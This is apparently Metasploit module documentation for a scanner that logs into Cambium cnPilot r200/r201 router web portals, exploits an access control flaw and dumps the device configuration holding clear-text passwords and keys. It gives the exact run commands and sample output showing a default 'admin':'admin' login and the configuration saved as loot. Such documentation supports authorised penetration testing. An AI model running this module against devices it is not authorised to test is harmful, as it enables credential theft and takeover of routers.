This module scans for Cambium cnPilot r200/r201 management login portal(s), attempts to identify valid credentials, and dump device configuration.

The device has at least two (2) users - admin and user. Due to an access control vulnerability, it is possible for 'user' account to access full device config. All information, including passwords, and keys, is stored insecurely, in clear-text form, thus allowing unauthorized 'admin' access to any user.

## Verification Steps

1. Do: ```use auxiliary/scanner/http/cnpilot_r_web_login_loot```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```run```

## Sample Output

  ```
msf > use auxiliary/scanner/http/cnpilot_r_web_login_loot
msf auxiliary(cnpilot_r_web_login_loot) > set rhosts 1.3.3.7
msf auxiliary(cnpilot_r_web_login_loot) > run

[*] 1.3.3.7:80   - Cambium cnPilot confirmed...
[+] 1.3.3.7:80   - Attempting to login...
[+] SUCCESSFUL LOGIN - 1.3.3.7:80 - "admin":"admin"
[*] 1.3.3.7:80 - dumping device configuration
[+] 1.3.3.7:80 - Configfile.cfg retrieved successfully!
[+] 1.3.3.7:80   - File saved in: /root/.msf4/loot/20000000000003_default_1.3.3.7_Configfile.cfg_12345.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

  ```
